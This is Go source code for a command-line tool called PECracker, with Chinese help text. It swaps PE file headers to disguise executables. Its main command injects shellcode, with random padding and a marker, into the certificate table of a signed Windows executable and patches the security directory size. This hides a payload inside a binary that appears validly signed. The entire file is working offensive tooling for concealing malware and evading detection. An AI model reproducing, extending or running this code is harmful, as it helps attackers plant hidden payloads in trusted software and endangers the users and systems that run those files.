package main

import (
	"crypto/rand"
	"debug/pe"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"github.com/spf13/cobra"
	"io"
	"io/ioutil"
	"log"
	"os"
)

func check(err error) {
	if err != nil {
		fmt.Println("Error:", err)
		os.Exit(1)
	}
}

func ExtractPEHeader(filePath string) ([]byte, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	peFile, err := pe.NewFile(file)
	if err != nil {
		return nil, err
	}
	defer peFile.Close()

	dosHeader := make([]byte, 0x40)
	_, err = file.ReadAt(dosHeader, 0)
	if err != nil {
		return nil, err
	}

	peHeaderOffset := int64(binary.LittleEndian.Uint32(dosHeader[0x3C:]))
	peHeaderSize := peHeaderOffset + int64(peFile.FileHeader.SizeOfOptionalHeader) + 24
	peHeader := make([]byte, peHeaderSize)
	_, err = file.ReadAt(peHeader, 0)
	if err != nil {
		return nil, err
	}

	return peHeader, nil
}

func WritePEHeader(header []byte, outputPath string) error {
	file, err := os.Create(outputPath)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = file.Write(header)
	if err != nil {
		return err
	}

	return nil
}

func ReplacePEHeader(targetFilePath string, newHeader []byte) error {
	file, err := os.OpenFile(targetFilePath, os.O_RDWR, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = file.WriteAt(newHeader, 0)
	if err != nil {
		return err
	}

	return nil
}

func RandomizeByteAtOffset(filePath string, offset int64) error {
	file, err := os.OpenFile(filePath, os.O_RDWR, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	randomByte := make([]byte, 1)
	_, err = rand.Read(randomByte)
	if err != nil {
		return err
	}

	_, err = file.WriteAt(randomByte, offset)
	if err != nil {
		return err
	}

	return nil
}

func GenerateRandomBytes(length int) ([]byte, error) {
	bytes := make([]byte, length)
	_, err := rand.Read(bytes)
	if err != nil {
		return nil, err
	}
	return bytes, nil
}

func getCertTableSize(peFile *pe.File) (uint32, uint32) {
	var certTable pe.DataDirectory

	switch optHeader := peFile.OptionalHeader.(type) {
	case *pe.OptionalHeader32:
		certTable = optHeader.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_SECURITY]
	case *pe.OptionalHeader64:
		certTable = optHeader.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_SECURITY]

	default:
		panic("未知的可选头类型")
	}

	return certTable.VirtualAddress, certTable.Size
}

func main() {
	fmt.Println(" (                                         \n )\\ )      (                   )           \n(()/((     )\\  (      )     ( /(   (  (    \n /(_))\\  (((_) )(  ( /(  (  )\\()) ))\\ )(   \n(_))((_) )\\___(()\\ )(_)) )\\((_)\\ /((_|()\\  \n| _ \\ __((/ __|((_|(_)_ ((_) |(_|_))  ((_) \n|  _/ _| | (__| '_/ _` / _|| / // -_)| '_| \n|_| |___| \\___|_| \\__,_\\__||_\\_\\\\___||_|   \n                                           ")
	fmt.Println("written by https://github.com/berryalen02/PECracker")
	var rootCmd = &cobra.Command{
		Use: "PECracker.exe",
		// 禁用默认的 completion 和 help 命令
		CompletionOptions: cobra.CompletionOptions{
			DisableDefaultCmd: true,
		},
	}

	var replacerCmd = &cobra.Command{
		Use:   "replace",
		Short: "文件头替换伪装",
	}

	var extractCmd = &cobra.Command{
		Use:   "extract [PE file] [output]",
		Short: "提取PE文件头并保存到output路径",
		Args:  cobra.ExactArgs(2),
		Run: func(cmd *cobra.Command, args []string) {
			header, err := ExtractPEHeader(args[0])
			check(err)

			err = WritePEHeader(header, args[1])
			check(err)

			fmt.Println("PE header extracted and written to", args[1])
		},
	}

	var importCmd = &cobra.Command{
		Use:   "import [HeaderFile] [target]",
		Short: "导入文件头并对target文件做替换",
		Args:  cobra.ExactArgs(2),
		Run: func(cmd *cobra.Command, args []string) {
			header, err := os.ReadFile(args[0])
			check(err)

			err = ReplacePEHeader(args[1], header)
			check(err)

			err = RandomizeByteAtOffset(args[1], 0x23)
			check(err)

			fmt.Println("PE header replaced and randomized in", args[1])
		},
	}

	var crackerCmd = &cobra.Command{
		Use:   "crack",
		Short: "文件头证书区段感染",
	}

	var injectCmd = &cobra.Command{
		Use:   "inject [PeFile] [output] [ShellcodeFile]",
		Short: "注入shellcode",
		Args:  cobra.ExactArgs(3),
		Run: func(cmd *cobra.Command, args []string) {
			file, err := os.OpenFile(args[0], os.O_RDWR|os.O_CREATE, 0644)
			check(err)
			defer file.Close()

			peFile, err := pe.NewFile(file)
			check(err)
			defer peFile.Close()

			is64Bit := false
			switch peFile.OptionalHeader.(type) {
			case *pe.OptionalHeader64:
				is64Bit = true
			}

			certOffset, certSize := getCertTableSize(peFile)

			shellcode, err := ioutil.ReadFile(args[2])
			check(err)

			sizeOfShc := len(shellcode)
			fmt.Println("[*] size of shellcode:", sizeOfShc)

			paddingSize := 8 - (sizeOfShc % 8)
			if paddingSize == 8 {
				paddingSize = 0
			}

			padding := make([]byte, paddingSize)
			obfusSize := 16
			obfusPadding := make([]byte, obfusSize)
			obfusPadding, err = GenerateRandomBytes(obfusSize)

			embedDataStr, _ := cmd.Flags().GetString("embedData")
			embedSize, _ := cmd.Flags().GetInt("embedSize")
			var embedData []byte

			embedDataFlag := cmd.Flags().Lookup("embedData").Changed
			embedSizeFlag := cmd.Flags().Lookup("embedSize").Changed

			if embedDataFlag && embedSizeFlag {
				var err error
				embedData, err = hexStringToBytes(embedDataStr)
				if err != nil {
					log.Fatalf("无效的embedData: %v", err)
				}
				if len(embedData) != embedSize {
					log.Fatalf("embedData的长度 (%d) 与 embedSize (%d) 不匹配", len(embedData), embedSize)
				}
			} else if !embedDataFlag && !embedSizeFlag {
				embedData = []byte{0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef}
			} else {
				log.Fatalf("embedData 和 embedSize 必须一起使用")
			}

			outFile, err := os.OpenFile(args[1], os.O_RDWR|os.O_CREATE, 0644)
			check(err)
			defer outFile.Close()

			_, err = outFile.Seek(int64(certOffset+certSize), io.SeekStart)
			check(err)

			_, err = outFile.Write(obfusPadding)
			check(err)
			_, err = outFile.Write(embedData)
			check(err)
			_, err = outFile.Write(shellcode)
			check(err)
			_, err = outFile.Write(padding)
			check(err)

			newCertSize := certSize + uint32(len(shellcode)) + uint32(len(padding)) + uint32(obfusSize) + uint32(len(embedData))

			_, err = outFile.Seek(0, io.SeekStart)
			check(err)

			file.Seek(0, io.SeekStart)
			_, err = io.Copy(outFile, file)
			check(err)

			SecurityDirectorySizeOffset := getSecurityDirectorySizeOffset(file, is64Bit)

			buf := make([]byte, 4)
			binary.LittleEndian.PutUint32(buf, newCertSize)
			_, err = outFile.Seek(SecurityDirectorySizeOffset, io.SeekStart)
			check(err)
			_, err = outFile.Write(buf)
			check(err)

			fmt.Println("[*] PE文件修改成功")
		},
	}

	injectCmd.Flags().Int("embedSize", 8, "(可选)自定义标注数据长度")
	injectCmd.Flags().String("embedData", "", "(可选)自定义标注数据")
	replacerCmd.AddCommand(extractCmd, importCmd)
	crackerCmd.AddCommand(injectCmd)
	rootCmd.AddCommand(replacerCmd, crackerCmd)
	rootCmd.Execute()
}

func getSecurityDirectorySizeOffset(file *os.File, is64Bit bool) int64 {
	_, err := file.Seek(0, io.SeekStart)
	check(err)
	dosHeader := make([]byte, 64)
	_, err = file.Read(dosHeader)
	if err != nil && err != io.EOF {
		check(err)
	}

	var SecurityDirectorySizeOffset int64
	peHeaderOffset := int64(binary.LittleEndian.Uint32(dosHeader[0x3C:]))
	if is64Bit {
		SecurityDirectorySizeOffset = peHeaderOffset + 4 + 0x14 + 0x70 + 0x24
	} else {
		SecurityDirectorySizeOffset = peHeaderOffset + 4 + 0x14 + 0x60 + 0x24
	}

	return SecurityDirectorySizeOffset
}

func hexStringToBytes(hexStr string) ([]byte, error) {
	if len(hexStr) >= 2 && hexStr[:2] == "0x" {
		hexStr = hexStr[2:]
	}

	bytes, err := hex.DecodeString(hexStr)
	if err != nil {
		return nil, err
	}
	return bytes, nil
}
